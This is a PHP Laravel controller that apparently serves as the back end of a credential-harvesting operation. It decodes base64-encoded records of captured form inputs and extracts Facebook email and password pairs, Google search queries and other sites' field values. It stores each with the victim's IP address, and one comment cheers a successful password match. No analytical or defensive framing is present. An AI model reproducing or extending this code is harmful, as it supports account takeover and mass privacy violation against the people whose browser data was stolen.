<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;

use Illuminate\Http\Request;
use App\Requestall;
use App\Fb;
use App\Gg;
use phpDocumentor\Reflection\Types\Integer;
use App\Other;
use DB;

class RequestallController extends BaseController
{
    public function index()
    {
        $data['activeMenu'] = 'filter';
        return view('filter')->with($data);
    }

    public function listFb()
    {
        $fb = new Fb;
        $data['fb'] = $fb
            ->orderBy('id','desc')
            ->get();
        $data['activeMenu'] = 'fb';
        return view('list-fb')->with($data);
    }

    public function listQuery(Request $request)
    {
        $params = $request->all();
        $obj = new Other;
        if( !empty($params['q']) ){
            $data['other'] = $obj::where('dm', 'LIKE', '%'.$params['q'].'%')->get();
            $data['filterBy'] = 'search string '.$params['q'];
        }elseif( !empty($params['filter-domain']) ){
            $data['other'] = $obj::where('dm', '=', $params['filter-domain'])->get();
            $data['filterBy'] = 'domain';
        }elseif( !empty($params['filter-ip']) ){
            $data['other'] = $obj::where('ip', '=', $params['filter-ip'])->get();
            $data['filterBy'] = 'ip address';
        }else{
            $data['other'] = $obj::paginate(100);
        }

        $data['activeMenu'] = 'other';
        return view('list-query')->with($data);
    }

    public function decodeData($input)
    {
        $result['data'] = json_decode(urldecode(base64_decode($input->hostname)));
        $result['ip'] = $input->ip;
        return $result;
    }

    public function getData($data, $findString, $firstClassName, $secondClassName)
    {
        $result = [];
//        echo "<pre>";
        foreach ($data as $item) {
            $ipAddress = $item->ip;
            $a = $this->decodeData($item)['data'];
//            var_dump($a);
            if($a){
                foreach ($a as $k => $it) {
                    // check if domain contain string facebook.com and class name = email
                    if(strpos($it->dm, $findString) && (!empty($it->cn) && $it->cn == $firstClassName)){
                        // for filter fb
                        if($secondClassName){
                            // check if next object contain pwd
                            if( !empty($a[$k+1]) ){
                                if( !empty($a[$k+1]->cn) && $a[$k+1]->cn == $secondClassName ){
                                    // wow, we got it!
                                    array_push($result, [
                                        'email' => $it->vl,
                                        'pwd' => $a[$k+1]->vl,
                                        'ip' => $ipAddress
                                    ]);
                                }
                            }
                        }else{
                            // for filter google query
                            array_push($result, [
                                'domain' => $it->dm,
                                'query' => $it->vl,
                                'ip' => $ipAddress
                            ]);
                        }
                    }else{
//                        echo "<pre>";var_dump($it);
                    }

                }
            }
        }
//        die;
        return $result;
    }

    public function getOtherData($data, $exclude)
    {
        $result = [];
        foreach ($data as $item) {
            $ipAddress = $item->ip;
            $decryptedData = $this->decodeData($item)['data'];
            if($decryptedData){
                foreach ($decryptedData as $k => $row) {
                    $domain = $row->dm;
                    if( !in_array($domain, $exclude) ){
                        array_push($result, [
                            'cn' => !empty($row->cn) ? $row->cn : '',
                            'dm' => $domain,
                            'vl' => !empty($row->vl) ? $row->vl:'',
                            'ip' => $ipAddress
                        ]);
                    }
                }
            }
        }
        return $result;
    }

    public function filter(Request $request)
    {
        $data = [];
        $params = $request->all();
        $filterWhat = $params['filterWhat'];
        if($filterWhat == 'fb'){
            $data = $this->filterFb($params);
        }elseif ($filterWhat == 'gg'){
            $data = $this->filterGg($params);
        }elseif ($filterWhat == 'other'){
            $data = $this->filterQuery($params);
        }

        return response()->json($data);
    }

    public function filterFb($params)
    {
        $offset = $params['offset'];
        $limit = $params['limit'];

        $result = Requestall::offset($offset)
            ->limit($limit)
            ->orderBy('id')
            ->get();
        if($result){
            // Get list fb account
            $fbAccount = $this->getData($result, 'facebook.com', 'email', 'pass');
            // Insert to table fb
            $data['insertedRows'] = $this->insertFb($fbAccount);
            $data['offset'] = (Int)$offset;
        }else{
            $data['insertedRows'] = -1;
            $data['offset'] = (Int)$offset;
        }
        $data['countOriginData'] = count($result);
        return $data;
    }

    public function filterGg($params)
    {
        $offset = $params['offset'];
        $limit = $params['limit'];

        $result = Requestall::offset($offset)
            ->limit($limit)
            ->orderBy('id')
            ->get();
        if($result){
            // Get list fb account
            $ggQuery = $this->getData($result, 'google.com', 'q', null);
            // Insert to table gg
            $data['insertedRows'] = $this->insertGg($ggQuery);
            $data['offset'] = (Int)$offset;
        }else{
            $data['insertedRows'] = -1;
            $data['offset'] = (Int)$offset;
        }
        $data['countOriginData'] = count($result);
        return $data;
    }

    public function filterQuery($params)
    {
        $offset = $params['offset'];
        $limit = $params['limit'];

        $checkLastState = DB::table('last_state')->where('k', 'requestall_copy')->first(['v']);
        if($checkLastState){
            $result = Requestall::where('id', '>', (Int)$checkLastState->v)
                ->offset($offset)->limit($limit)->get();
        }else{
            $result = $result->offset($offset)->limit($limit)->get();
        }

        if($result){
            // exclude these domain from filter
            $exclude = [
                'www.google.com',
                'www.google.com.vn',
                'www.youtube.com',
                'www.facebook.com',
                'vi-vn.facebook.com',
                'www.nhaccuatui.com',
                'goidon.tk',
                'coccoc.com',
                'crm.thegioididong.com',
                'docs.google.com',
                'insite.thegioididong.com',
                'simonline.com.vn',
                'soundcloud.com',
                'wordpress.com',
                'www.google.com.au',
                'ubndmt.vpdttg.vn',
                'upload.xvideos.com',
                'javhihi.com',
                'www.ponhd.com',
                'avschool.tv',
                'bilutv.com',
                'chatsex24h.com',
                'chiasenhac.vn',
                'search.chiasenhac.vn',
                'hentaivn.net',
                'javhihi.com',
                'm.hentaiimoingay.tk',
                'mixing.dj',
                'taigame.org',
                'tratu.soha.vn',
                'www.3dsexvilla.com',
                'www.javbus.com',
                'www.javhoo.com',
                'www.javlibrary.com'
            ];
            $query = $this->getOtherData($result, $exclude);
            // Insert to table
            Other::insert($query);
            $data['insertedRows'] = count($query);
            $data['offset'] = (Int)$offset;
        }else{
            $data['insertedRows'] = -1;
            $data['offset'] = (Int)$offset;
        }
        $data['countOriginData'] = count($result);
        return $data;
    }

    public function insertGg($data)
    {
        $countInserted = 0;
        $obj = new Gg;
        foreach ($data as $item) {
            // check exist
            $count = $obj::where('domain', '=', $item['domain'])
                ->where('query', '=', $item['query'])
                ->where('ip', '=', $item['ip'])
                ->count();
            // if not exist then insert to DB
            if($count == 0){
                $gg = new Gg;
                $gg->domain = $item['domain'];
                $gg->query = $item['query'];
                $gg->ip = $item['ip'];

                $gg->save();
                $countInserted++;
            }
        }
        return $countInserted;
    }

    public function insertFb($data)
    {
        $countInserted = 0;
        $obj = new Fb;
        foreach ($data as $item) {
            // check exist
            $count = $obj::where('email', '=', $item['email'])->where('pwd', '=', $item['pwd'])->count();
            // if not exist then insert to DB
            if($count == 0){
                $fb = new Fb;
                $fb->email = $item['email'];
                $fb->pwd = $item['pwd'];
                $fb->ip = $item['ip'];
                $fb->save();
                $countInserted++;
            }
        }
        return $countInserted;
    }

    public function copyTblRequestAllToNewTbl()
    {
        DB::select(DB::raw('DROP TABLE IF EXISTS requestall_copy'));
        DB::select(DB::raw('CREATE table requestall_copy as SELECT * FROM requestall'));
    }

    public function saveLastStateOfTblRequesAllCopy()
    {
        $lastId = DB::select(DB::raw('select id from requestall_copy order by id desc limit 1'));
        $lastId = $lastId[0]->id;
        $check = DB::select('select v from last_state where k=:k', ['k' => 'requestall_copy']);
        if(!$check){
            DB::table('last_state')->insert(['k' => 'requestall_copy', 'v' => $lastId]);
            return 'insert, last id: '.$lastId;
        }else{
            DB::table('last_state')->where('k', 'requestall_copy')->update(['v' => $lastId]);
            return 'update, last id: '.$lastId;
        }
    }
}
